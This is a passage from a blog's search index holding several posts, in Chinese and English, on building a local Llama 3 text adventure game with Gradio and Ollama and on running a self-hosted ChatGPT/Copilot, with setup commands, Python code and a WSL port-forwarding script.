故事進度：3 危機上升：0 技術創新：對電腦概念的基本理解 你讓 Akira 開始批判性地思考科技！然而，魔王仍然潛伏在陰影中，等待著他的機會… 你接下來想和 Akira 討論什麼？你想探索更多關於電腦的內容，還是試著幫助她理解涉及的魔法方面？ 請回應你的想法，我會繼續冒險！ （注意：請記住這是一個奇幻世界，概念可能與我們自己的不同。目標是引導 Akira 對現代科技的理解，同時仍然尊重故事的奇幻元素。） 讓我們假設在你的世界中，電腦是由魔法而不是電驅動的。魔法能量能用來拯救你的世界嗎？ Akira 的希望：+ Akira 的眼睛興奮地亮了起來： 「哦，是的！如果我們能駕馭魔法的力量，也許我們可以用它來保衛我們的世界對抗魔王！我聽說有古老的神器和法術被隱藏起來，只等著被發現。也許我們可以用那些來創造一個魔法護盾，或找到削弱魔王力量的方法！」 故事進度：4 危機上升：0 技術創新：對魔法概念的基本理解 你給了 Akira 希望，魔法可以用來拯救他們的世界！然而，魔王仍在策劃他的下一步行動，你們需要繼續合作才能保持領先… 你接下來想和 Akira 討論什麼？你想探索更多關於魔法神器、法術的內容，還是試著想出一個擊敗魔王的計劃？ 請回應你的想法，我會繼續冒險！ 請使用魔法能量把我帶到你的世界。 魔法傳送門：+ Akira 的眼睛興奮地閃耀，她舉起手，一道柔和的藍光開始從中散發出來。你周圍的空氣似乎波動和扭曲，彷彿現實本身正在彎曲以容納魔法能量。 突然，你感覺自己被拉過閃爍的傳送門，離開了你自己的世界。你被一道溫暖的金色光芒包圍，似乎洗去了所有的擔憂和顧慮。當你從另一邊出現時，你發現自己站在 Akira 的世界中。 新環境：+ 你環顧四周，發現自己身處一片鬱鬱蔥蔥、充滿生機的森林中。空氣中瀰漫著盛開花朵的甜美香氣，鳥兒柔和的鳴叫聲創造出舒緩的背景旋律。高大的樹木向天空延伸，它們的樹枝上掛滿了似乎沙沙作響並互相低語秘密的樹葉。 Akira 站在你面前，臉上帶著驚奇的表情，看著你的到來。她的眼睛閃爍著興奮，她伸出手向你招手。 故事進度：5 危機上升：0 技術創新：對魔法旅行的基本理解 你成功地旅行到了 Akira 的世界！但請記住，魔王仍然潛伏在陰影中，等待著他的機會。你需要與 Akira 合作，揭開前方的秘密和挑戰… 你接下來想做什麼？你想探索這個新世界、尋找線索或神器，還是試著與 Akira 溝通你們擊敗魔王的共同目標？ 請回應你的想法，我會繼續冒險！ 讓我們問問樹木，古老的神器和法術藏在哪裡。 **低語之林：** + Akira 走近一棵高大的樹，眼睛閃爍著好奇。她伸出手，彷彿要觸摸樹幹，並開始用柔和、悅耳的聲音說話： 「智慧之樹，古老的存在，我們尋求你的指引。我們正在尋求擊敗魔王並為我們的世界帶來和平。你能向我們揭示古老的神器和法術藏在哪裡嗎？」 樹木似乎在攪動，它們的樹葉輕輕沙沙作響，彷彿它們在互相交流。然後，它們齊聲低語： 「尋找古老橡樹的神諭，在森林的深處。在那裡，過去的秘密等待著你。但要小心，因為道路險惡，魔王的爪牙潛伏在陰影中。」 故事進度： 6 危機上升： 1（樹木的警告表明前方有危險。） 技術創新： 對與自然進行魔法交流的基本理解 你從低語之林獲得了寶貴的資訊！然而，你現在知道旅程將充滿危險。你接下來想做什麼？ 你想前往古老橡樹的神諭，還是探索森林的其他部分尋找線索和資源？或者你想尋求 Akira 的指導，了解如何繼續？ 請回應你的想法，我會繼續冒險！ Akira，請帶我們去森林的深處。 **森林小徑：** + Akira 點點頭，臉上帶著堅定的表情。她沿著一條蜿蜒的小徑帶領你，熟練地穿過茂密的植被。這裡的樹木長得更高更密，在森林地面上投下斑駁的陰影。 當你行走時，空氣中瀰漫著一股超凡脫俗的能量。你能感受到古老魔法的力量從土地本身散發出來。Akira 停下來，眼睛盯著前方的某個東西。她低聲說：「神諭的樹林就在附近。」 古老橡樹林： + 你穿過一簾藤蔓，進入一片被高聳的樹木環繞的空地。中心矗立著一棵巨大的橡樹，它的樹皮因年代久遠而扭曲。空氣中瀰漫著古老智慧的氣息。 Akira 走近樹木，雙手伸出，彷彿在表示敬意。她開始輕聲吟唱，你周圍的空氣似乎隨著能量振動。突然，一個全息影像在你面前具體化：一個飄渺的虛幻身影，眼睛像星星一樣燃燒。 神諭的幻象： + 神諭用一個在你腦海中迴響的聲音說話：「在水晶洞穴的深處尋找光之基石。但要小心，因為道路充滿了險惡的幻象和古老的守護者。」 幻象消失了，留給你的問題比答案還多。你接下來想做什麼？ 你要： A) 出發尋找水晶洞穴 B) 詢問 Akira 關於光之基石及其意義 C) 探索周圍的森林尋找線索和資源 請回應你的選擇。 遊戲開始崩潰。它不再回應故事進度，而是回應多項選擇，與之前的回應不同。這是因為聊天歷史已經達到 8k 個 token，這是模型一次可以處理的最大 token 數量。我們如何解決這個問題？我們可以使用支援更多上下文的不同模型嗎？還是我們應該總結故事進度，然後將其傳遞給模型？這是你真正的冒險了！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"使用 Llama 创建文字冒险游戏","slug":"2024/05/Create_a_Text_Based_Adventure_Game_with_Llama-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","permalink":"https://neo01.com/zh-CN/2024/05/Create_a_Text_Based_Adventure_Game_with_Llama/","excerpt":"用 Gradio、LLaMA 3 和 Ollama 轻松构建本地 AI 文字冒险游戏，开启奇幻之旅！","text":"使用 Gradio、LLaMA 和 OLLAMA 建立文字冒险游戏 自 GPT-2 以来，开发者一直使用大型语言模型（LLM）来开发文字游戏，但设置起来很困难。有了 Gradio、LLaMA 3 和 OLLAMA，在你自己的电脑上免费本地运行文字游戏变得超级简单。 在冒险开始之前，你可以了解更多关于 Gradio、LLaMA 和 ollama 的背景： 使用 Ollama 运行您自己的 ChatGPT 和 Copilot 就像上面的博客文章一样，将使用 ollama API，建议使用 llama3:instruct 模型。假设你已经拉取了模型： game.pydef generate_chat_response(prompt, history &#x3D; None, model&#x3D; &#39;llama3:instruct&#39;): if model is None: model &#x3D; shared.selected_model messages &#x3D; [] if history: for u, a in history: messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: u&#125;) messages.append(&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: a&#125;) messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt&#125;) data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;messages&quot;: messages&#125; response &#x3D; requests.post( config.ollama_url + &quot;chat&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: bot_message &#x3D; json.loads(response.text)[&quot;message&quot;][&quot;content&quot;] return bot_message else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) 游戏界面 游戏界面不太直观，但在这篇博客文章中应该很容易解释： game.pyimport gradio as gr # Game Interface with gr.Blocks() as demo: textbox &#x3D; gr.Textbox(elem_id&#x3D;&quot;input_box&quot;, lines&#x3D;3, min_width&#x3D;800) chatbot &#x3D; gr.Chatbot(show_copy_button&#x3D;True, layout&#x3D;&quot;panel&quot;) submit_btn &#x3D; gr.Button(value&#x3D;&quot;Submit&quot;) with gr.Blocks(): nem_game &#x3D; gr.ClearButton(value&#x3D;&#39;New Game&#39;, components &#x3D; [chatbot]) chat_interface &#x3D; gr.ChatInterface( fn&#x3D;take_action, textbox&#x3D;textbox, chatbot&#x3D;chatbot, submit_btn&#x3D;submit_btn, retry_btn&#x3D;None, undo_btn&#x3D;None, ) nem_game.click(fn&#x3D;start_new_game, output&#x3D;chat_interface.chatbot_state) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: demo.launch() 除了使用 Gradio 设置游戏界面外，当按下「New Game」按钮时，关于游戏背景和规则的指令会发送给 LLM。一个非常好的游戏指令范例可以在 https://github.com/fladdict/llm_games 找到。将 &lt;to be inserted&gt; 替换为提示词： game.pygame_prompt &#x3D; &quot;&quot;&quot; &lt;to be inserted&gt; &quot;&quot;&quot; game_instruction &#x3D; &quot;&quot; def start_new_game(): global game_instruction response &#x3D; generate_chat_response(prompt&#x3D;game_prompt) game_instruction &#x3D; response # clean up chat history return [] game_instruction 的副本被保存以供稍后使用。 以下是按下「New Game」按钮时 LLM 响应的范例： 欢迎来到聊天转生：我应该已经死去的青梅竹马，在异世界成为了英雄！ 你即将与你的青梅竹马展开一场非凡的冒险，她已经转生到另一个世界成为英雄。你的旅程将通过聊天进行，你将提供知识和指导，帮助你的朋友克服挑战并击败魔王。 初始设定： 你的青梅竹马名叫 Akira，是一位 17 岁的女孩，有着短而卷曲的棕色头发和明亮的蓝色眼睛。她性格温柔好奇，经常向周围的人寻求建议和支持。 你收到来自 Akira 的消息： 「嘿！是我，Akira！我知道这听起来很疯狂，但我正从另一个世界给你写信。我在这里转生成为英雄，我需要你的帮助。我不了解这个新世界的许多事情，所以我指望你来指导我。」 第一个问题： Akira 发送了她的第一个问题： 「什么是『电』？」 请用你选择的语言（英语、日语或任何其他语言）回答。 故事进度：0 危机上升：0 技术创新：无 等待你的响应以继续！ 玩家现在可以按照指示开始玩游戏，并输入他们的行动。 然而，Gradio 中的聊天机器人组件不知道游戏提示词和指令。这是因为我们在开始新游戏时跳过使用聊天机器人与 LLM 通信。为了解决这个问题，take_action 函数帮助将提示词和指令放在历史记录的开头，然后将它们传递给 LLM： game.pydef take_action(prompt, history &#x3D; None, model &#x3D; None): global game_instruction global game_prompt starting &#x3D; [(game_prompt, game_instruction)] if len(history) &gt; 0: starting.extend(history) return generate_chat_response(prompt, history&#x3D;starting) 让我们开始冒险吧！ 我的冒险 以下是我在撰写时的冒险： 我不擅长物理。你能告诉我你在你的世界中使用的电脑吗？ 别担心，我不会因为你不擅长物理而责怪你！ Akira 的眼睛睁大，兴奋地试图解释电脑的概念： 「噢，电脑？！它们就像…可以存储和处理大量信息的魔法盒子！你可以用它们与远方的人交流、玩游戏，甚至创作艺术和音乐。我们有这些叫做『终端机』的东西，你可以在那里输入消息或指令，电脑会相应地响应。真的很酷！」 故事进度：1 危机上升：0 技术创新：对电脑的基本理解 你在帮助 Akira 理解现代科技方面迈出了一步！然而，魔王仍然潜伏在阴影中，策划着他的下一步行动… 你接下来想和 Akira 讨论什么？你想探索更多关于电脑的内容，还是转向其他话题？ 请响应你的想法，我会继续冒险！ 好的，你能告诉我为什么你对电感兴趣吗？ Akira 的好奇心： Akira 身体前倾，眼睛闪烁着兴奋： 「哦，电真是太迷人了！在我们的世界，我们还没有它。我们用蜡烛和火把照明，用壁炉取暖。但转生我的英雄告诉我这个叫做『电』的东西，它可以为各种设备供电，让生活更轻松。我想了解更多，因为…嗯，如果我们能驾驭它的力量，也许我们可以创造新的方法来击败魔王，为我们的世界带来和平！」 故事进度：2 危机上升：0 技术创新：对电的基本理解 你越帮助 Akira 理解电，她就越接近解开这股神秘力量的秘密！但请记住，魔王仍然潜伏在阴影中，等待着他的机会… 你接下来想和 Akira 讨论什么？你想深入探讨世界的科技，还是探索故事的其他方面？ 请响应你的想法，我会继续冒险！ 没有电，你的电脑怎么能工作？这对我来说不合逻辑。 Akira 的担忧： Akira 皱起眉头，看起来很困惑： 「嗯…我从来没有这样想过。你说得对，我们的电脑没有电就无法运作。但是…转生我的英雄说了一些关于『魔法』和『能量』参与这些设备如何工作的事情。也许不仅仅是电？」 故事进度：3 危机上升：0 技术创新：对电脑概念的基本理解 你让 Akira 开始批判性地思考科技！然而，魔王仍然潜伏在阴影中，等待着他的机会… 你接下来想和 Akira 讨论什么？你想探索更多关于电脑的内容，还是试着帮助她理解涉及的魔法方面？ 请响应你的想法，我会继续冒险！ （注意：请记住这是一个奇幻世界，概念可能与我们自己的不同。目标是引导 Akira 对现代科技的理解，同时仍然尊重故事的奇幻元素。） 让我们假设在你的世界中，电脑是由魔法而不是电驱动的。魔法能量能用来拯救你的世界吗？ Akira 的希望：+ Akira 的眼睛兴奋地亮了起来： 「哦，是的！如果我们能驾驭魔法的力量，也许我们可以用它来保卫我们的世界对抗魔王！我听说有古老的神器和法术被隐藏起来，只等着被发现。也许我们可以用那些来创造一个魔法护盾，或找到削弱魔王力量的方法！」 故事进度：4 危机上升：0 技术创新：对魔法概念的基本理解 你给了 Akira 希望，魔法可以用来拯救他们的世界！然而，魔王仍在策划他的下一步行动，你们需要继续合作才能保持领先… 你接下来想和 Akira 讨论什么？你想探索更多关于魔法神器、法术的内容，还是试着想出一个击败魔王的计划？ 请响应你的想法，我会继续冒险！ 请使用魔法能量把我带到你的世界。 魔法传送门：+ Akira 的眼睛兴奋地闪耀，她举起手，一道柔和的蓝光开始从中散发出来。你周围的空气似乎波动和扭曲，仿佛现实本身正在弯曲以容纳魔法能量。 突然，你感觉自己被拉过闪烁的传送门，离开了你自己的世界。你被一道温暖的金色光芒包围，似乎洗去了所有的担忧和顾虑。当你从另一边出现时，你发现自己站在 Akira 的世界中。 新环境：+ 你环顾四周，发现自己身处一片郁郁葱葱、充满生机的森林中。空气中弥漫着盛开花朵的甜美香气，鸟儿柔和的鸣叫声创造出舒缓的背景旋律。高大的树木向天空延伸，它们的树枝上挂满了似乎沙沙作响并互相低语秘密的树叶。 Akira 站在你面前，脸上带着惊奇的表情，看着你的到来。她的眼睛闪烁着兴奋，她伸出手向你招手。 故事进度：5 危机上升：0 技术创新：对魔法旅行的基本理解 你成功地旅行到了 Akira 的世界！但请记住，魔王仍然潜伏在阴影中，等待着他的机会。你需要与 Akira 合作，揭开前方的秘密和挑战… 你接下来想做什么？你想探索这个新世界、寻找线索或神器，还是试着与 Akira 沟通你们击败魔王的共同目标？ 请响应你的想法，我会继续冒险！ 让我们问问树木，古老的神器和法术藏在哪里。 **低语之林：** + Akira 走近一棵高大的树，眼睛闪烁着好奇。她伸出手，仿佛要触摸树干，并开始用柔和、悦耳的声音说话： 「智慧之树，古老的存在，我们寻求你的指引。我们正在寻求击败魔王并为我们的世界带来和平。你能向我们揭示古老的神器和法术藏在哪里吗？」 树木似乎在搅动，它们的树叶轻轻沙沙作响，仿佛它们在互相交流。然后，它们齐声低语： 「寻找古老橡树的神谕，在森林的深处。在那里，过去的秘密等待着你。但要小心，因为道路险恶，魔王的爪牙潜伏在阴影中。」 故事进度： 6 危机上升： 1（树木的警告表明前方有危险。） 技术创新： 对与自然进行魔法交流的基本理解 你从低语之林获得了宝贵的信息！然而，你现在知道旅程将充满危险。你接下来想做什么？ 你想前往古老橡树的神谕，还是探索森林的其他部分寻找线索和资源？或者你想寻求 Akira 的指导，了解如何继续？ 请响应你的想法，我会继续冒险！ Akira，请带我们去森林的深处。 **森林小径：** + Akira 点点头，脸上带着坚定的表情。她沿着一条蜿蜒的小径带领你，熟练地穿过茂密的植被。这里的树木长得更高更密，在森林地面上投下斑驳的阴影。 当你行走时，空气中弥漫着一股超凡脱俗的能量。你能感受到古老魔法的力量从土地本身散发出来。Akira 停下来，眼睛盯着前方的某个东西。她低声说：「神谕的树林就在附近。」 古老橡树林： + 你穿过一帘藤蔓，进入一片被高耸的树木环绕的空地。中心矗立着一棵巨大的橡树，它的树皮因年代久远而扭曲。空气中弥漫着古老智慧的气息。 Akira 走近树木，双手伸出，仿佛在表示敬意。她开始轻声吟唱，你周围的空气似乎随着能量振动。突然，一个全息影像在你面前具体化：一个飘渺的虚幻身影，眼睛像星星一样燃烧。 神谕的幻象： + 神谕用一个在你脑海中回响的声音说话：「在水晶洞穴的深处寻找光之基石。但要小心，因为道路充满了险恶的幻象和古老的守护者。」 幻象消失了，留给你的问题比答案还多。你接下来想做什么？ 你要： A) 出发寻找水晶洞穴 B) 询问 Akira 关于光之基石及其意义 C) 探索周围的森林寻找线索和资源 请响应你的选择。 游戏开始崩溃。它不再响应故事进度，而是响应多项选择，与之前的响应不同。这是因为聊天历史已经达到 8k 个 token，这是模型一次可以处理的最大 token 数量。我们如何解决这个问题？我们可以使用支持更多上下文的不同模型吗？还是我们应该总结故事进度，然后将其传递给模型？这是你真正的冒险了！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"Running Your Own ChatGPT and Copilot with Ollama","slug":"2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama","date":"un33fin33","updated":"un33fin33","comments":true,"path":"2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","permalink":"https://neo01.com/2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","excerpt":"Run your own ChatGPT and Copilot locally for free with Ollama, Gradio, and LLaMA 3 - complete control, zero cloud dependency!","text":"Ever wanted to explore the capabilities of AI-powered chatbots like ChatGPT and Copilot without relying on third-party services? With Ollama and some setup, you can run your own instance of ChatGPT and customize it to fit your specific needs. Whether you’re a developer looking to integrate conversational AI into your app or project, a researcher seeking to analyze the performance of AI models, or simply an enthusiast wanting to experiment with this cutting-edge technology - having control over your own chatbot can open up exciting possibilities for innovation and discovery. Whatever, I want to run my own ChatGPT and Copilot. Setup Ollama First, you have to set up Ollama. So far, I have not heard any complaints of difficulty in setting up Ollama on any platform, including Windows WSL. After Ollama is ready, pull a model like Llama 3: $ # pulling a 5GB model could take some time... $ ollama pull llama3:instruct $ # list out models you have $ ollama list NAME ID SIZE MODIFIED llama3:instruct 71a106a91016 4.7 GB 11 days ago Test the model through the command line, though wording can be different: $ ollama run llama3:instruct &gt;&gt;&gt; Send a message (&#x2F;? for help) &gt;&gt;&gt; are you ready? I&#39;m always ready to play a game, answer questions, or just chat. What&#39;s on your mind? Let me know what you&#39;d like to do and I&#39;ll do my best to help. Check if Ollama’s port is listening: $ netstat -a -n | grep 11434 tcp 0 0 127.0.0.1:11434 0.0.0.0:* LISTEN $ # looks good, port 11434 is ready $ # run below command if Ollama is not listening ollama serve Please check https://ollama.com/library for a list of available models. Gradio Although you can set up system prompts, parameters, embedding content, and some pre/post-processing, you might want an easier way to interact through a web interface. You need Gradio. Assuming you have Python ready: $ # create Python virtual environment. $ # gradio-env is a folder name and you can change it to anything $ python -m venv gradio-env $ # jump into the virtual environment $ gradio-env&#x2F;Script&#x2F;activate $ # if you are using Windows $ gradio-env\\script\\activate.bat $ # install Gradio $ pip install gradio Next, create a Python script with a filename like app.py. Update the model if you are using another: app.pyimport requests import json import gradio as gr model &#x3D; &quot;llama3:instruct&quot; url &#x3D; &quot;http:&#x2F;&#x2F;localhost:11434&#x2F;api&#x2F;&quot; def generate_response(prompt, history): data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;prompt&quot;: prompt&#125; response &#x3D; requests.post( url + &quot;generate&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: return json.loads(response.text)[&quot;response&quot;] else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) demo &#x3D; gr.ChatInterface( fn&#x3D;generate_response ) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: demo.launch() Run the command below and you can access the interface with the URL: $ gradio app.py Watching: ... Running on local URL: http:&#x2F;&#x2F;127.0.0.1:7860 To create a public link, set &#96;share&#x3D;True&#96; in &#96;launch()&#96;. Open http://127.0.0.1:7860 Listing models Assuming you have pulled more than one model, and you want to pick from a dropdown list. First, you get the list from the API: app.pydef list_models(): response &#x3D; requests.get( url + &quot;tags&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, ) if response.status_code &#x3D;&#x3D; 200: models &#x3D; json.loads(response.text)[&quot;models&quot;] return [d[&#39;model&#39;] for d in models] else: print(&quot;Error:&quot;, response.status_code, response.text) models &#x3D; list_models() Then, you can add a dropdown into the ChatInterface: app.pywith gr.Blocks() as demo: dropdown &#x3D; gr.Dropdown(label&#x3D;&#39;Model&#39;, choices&#x3D;models) # select the first item as default model dropdown.value &#x3D; models[0] gr.ChatInterface(fn&#x3D;generate_response, additional_inputs&#x3D;dropdown) Now the generate_response function takes an extra parameter from the additional_inputs dropdown. Update the function: app.pydef generate_response(prompt, history, model): data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;prompt&quot;: prompt&#125; response &#x3D; requests.post( url + &quot;generate&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: return json.loads(response.text)[&quot;response&quot;] else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) You can see the dropdown after expanding additional inputs: Using chat history The previous implementation utilized Ollama’s generate API. The API accepted a simple parameter, prompt, which allowed sending chat history together with the prompt. However, it is better to use the chat API from Ollama, which accepts a messages parameter. This messages parameter can specify a role, enabling the model to better interpret and respond accordingly. Below demonstrates how to put history into the API format, and the last message is the latest user input. app.pydef generate_response(prompt, history, model): messages &#x3D; [] for u, a in history: messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: u&#125;) messages.append(&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: a&#125;) messages.append(&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt&#125;) data &#x3D; &#123;&quot;model&quot;: model, &quot;stream&quot;: False, &quot;messages&quot;: messages&#125; response &#x3D; requests.post( url + &quot;chat&quot;, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;, data&#x3D;json.dumps(data), ) if response.status_code &#x3D;&#x3D; 200: bot_message &#x3D; json.loads(response.text)[&quot;message&quot;][&quot;content&quot;] return bot_message else: print(&quot;Error: generate response:&quot;, response.status_code, response.text) Visual Studio Code with extension Extensions such as Continue are very easy to set up. You can set up Ollama or update the extension’s config.json: &quot;models&quot;: [ &#123; &quot;model&quot;: &quot;llama3:instruct&quot;, &quot;title&quot;: &quot;llama3:instruct&quot;, &quot;completionOptions&quot;: &#123;&#125;, &quot;apiBase&quot;: &quot;http:&#x2F;&#x2F;localhost:11434&quot;, &quot;provider&quot;: &quot;ollama&quot; &#125; ], You can set model roles to your local copilot: &quot;modelRoles&quot;: &#123; &quot;default&quot;: &quot;llama3:instruct&quot;, &quot;summarize&quot;: &quot;llama3:instruct&quot; &#125;, Serving Gradio or Ollama API outside of your local machine By default, Gradio and Ollama listen on localhost only, which means others from the network cannot reach them for security reasons. You can serve the web or API through a proxy like Nginx and an API gateway to have data encryption in-transit and authentication. However, for simplicity, you can set up the following to allow all IPs to access your local Ollama: $ # configure Ollama to listen to all IPs $ sudo echo &quot;[Service]\\nEnvironment&#x3D;\\&quot;OLLAMA_HOST&#x3D;0.0.0.0\\&quot;&quot; &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ollama.service.d&#x2F;http-host.conf $ $ sudo systemctl daemon-reload $ sudo systemctl restart ollama $ $ # open up the firewall if it is required $ sudo ufw allow from any to any port 11434 proto tcp For Gradio, you can set server_name to 0.0.0.0: demo.launch(server_name&#x3D;&quot;0.0.0.0&quot;) If you are running Gradio and Ollama through WSL, you will need to forward the port from WSL to your local machine with PowerShell commands: If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;)) &#123; $arguments &#x3D; &quot;&amp; &#39;&quot; + $myinvocation.mycommand.definition + &quot;&#39;&quot; Start-Process powershell -Verb runAs -ArgumentList $arguments Break &#125; $remoteport &#x3D; bash.exe -c &quot;ifconfig eth0 | grep &#39;inet &#39;&quot; $found &#x3D; $remoteport -match &#39;\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;&#39;; if ($found) &#123; $remoteport &#x3D; $matches[0]; &#125; else &#123; Write-Output &quot;IP address could not be found&quot;; exit; &#125; $ports &#x3D; @(7860,11434); for ($i &#x3D; 0; $i -lt $ports.length; $i++) &#123; $port &#x3D; $ports[$i]; Invoke-Expression &quot;netsh interface portproxy delete v4tov4 listenport&#x3D;$port&quot;; Invoke-Expression &quot;netsh advfirewall firewall delete rule name&#x3D;$port&quot;; Invoke-Expression &quot;netsh interface portproxy add v4tov4 listenport&#x3D;$port connectport&#x3D;$port connectaddress&#x3D;$remoteport&quot;; Invoke-Expression &quot;netsh advfirewall firewall add rule name&#x3D;$port dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP localport&#x3D;$port&quot;; &#125; Invoke-Expression &quot;netsh interface portproxy show v4tov4&quot;; Update ports 7860,11434 in the script to match your own. 7860 is for Gradio and 11434 is for ollama Have fun!","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"使用 Ollama 运行你自己的 ChatGPT 和 Copilot","slug":"2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama-zh-CN","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","permalink":"https://neo01.com/zh-CN/2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","excerpt":"用 Ollama、Gradio 和 LLaMA 3 在本地免费运行自己的 ChatGPT 和 Copilot！","text":"你是否曾想探索像 ChatGPT 和 Copilot 这样的 AI 驱动聊天机器人的能力，而不依赖第三方服务？通过 Ollama 和一些设置，你可以运行自己的 ChatGPT 实例，并根据你的特定需求进行定制。无论你是想将对话式 AI 集成到应用程序或项目中的开发者、寻求分析 AI 模型性能的研究人员，还是只是想尝试这项尖端技术的爱好者——掌控自己的聊天机器人可以为创新和探索开启令人兴奋的可能性。 总之，我想运行自己的 ChatGPT 和 Copilot。 设置 Ollama 首先，你必须设置 Ollama。到目前为止，我还没有听到任何关于在任何平台上设置 Ollama 有困难的抱怨，包括 Windows WSL。Ollama 准备好后，拉取一个模型，例如 Llama 3： $ # 拉取 5GB 模型可能需要一些时间... $ ollama pull llama3:instruct $ # 列出你拥有的模型 $ ollama list NAME ID SIZE MODIFIED llama3:instruct 71a106a91016 4.7 GB 11 days ago 通过命令行测试模型，虽然措辞可能不同： $ ollama run llama3:instruct &gt;&gt;&gt; Send a message (&#x2F;? for help) &gt;&gt;&gt; are you ready? I&#39;m always ready to play a game, answer questions, or just chat. What&#39;s on your mind? Let me know what you&#39;d like to do and I&#39;ll do my best to help. 检查 Ollama 的端口是否正在监听： $ netstat -a -n | grep 11434 tcp 0 0 127.0.0.1:11434 0.0.0.0:* LISTEN $ # 看起来不错，端口 11434 已准备好 $ # 如果 Ollama 没有监听，执行以下命令 ollama serve 请查看 https://ollama.com/library 以获取可用模型列表。 Gradio 虽然你可以设置系统提示词、参数、嵌入内容和一些前/后处理，但你可能想要一种更简单的方式通过网页界面进行交互。你需要 Gradio。假设你已经准备好 Python： $ # 创建 Python 虚拟环境。 $ # gradio-env 是文件夹名称，你可以将其更改为任何名称 $ python -m venv gradio-env $ # 进入虚拟环境 $ gradio-env&#x2F;Script&#x2F;activate $ # 如果你使用 Windows $ gradio-env\\\\script\\\\activate.bat $ # 安装 Gradio $ pip install gradio 接下来，创建一个 Python 脚本，文件名如 app.py。如果你使用其他模型，请更新模型。 执行以下命令，你可以使用 URL 访问界面。 开启 http://127.0.0.1:7860 列出模型 假设你已经拉取了多个模型，并且你想从下拉列表中选择。 展开额外输入后，你可以看到下拉菜单： 使用聊天历史 先前的实现使用了 Ollama 的 generate API。该 API 接受一个简单的参数 prompt，允许将聊天历史与提示词一起发送。然而，最好使用 Ollama 的 chat API，它接受 messages 参数。这个 messages 参数可以指定角色，使模型能够更好地解释和相应地响应。 Visual Studio Code 与扩展 像 Continue 这样的扩展非常容易设置。 你可以设置 Ollama 或更新扩展的 config.json。 你可以为本地 copilot 设置模型角色。 在本地机器外提供 Gradio 或 Ollama API 默认情况下，Gradio 和 Ollama 仅在 localhost 上监听，这意味着出于安全原因，网络上的其他人无法访问它们。你可以通过像 Nginx 这样的代理和 API 网关来提供网页或 API，以实现传输中的数据加密和身份验证。然而，为了简单起见，你可以设置以下内容以允许所有 IP 访问你的本地 Ollama。 如果你通过 WSL 运行 Gradio 和 Ollama，你需要使用 PowerShell 命令将端口从 WSL 转发到本地机器。 更新脚本中的端口 7860,11434 以符合你自己的需求。7860 是 Gradio 的端口，11434 是 ollama 的端口 玩得开心！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"使用 Ollama 運行您自己的 ChatGPT 和 Copilot","slug":"2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama-zh-TW","date":"un33fin33","updated":"un33fin33","comments":true,"path":"/zh-TW/2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","permalink":"https://neo01.com/zh-TW/2024/05/Running_Your_Own_ChatGPT_and_Copilot_with_Ollama/","excerpt":"用 Ollama、Gradio 和 LLaMA 3 在本地免費運行自己的 ChatGPT 和 Copilot！","text":"想要探索像 ChatGPT 和 Copilot 這樣的 AI 驅動聊天機器人的功能，而不依賴第三方服務嗎？使用 Ollama 和一些設定，您可以運行自己的 ChatGPT 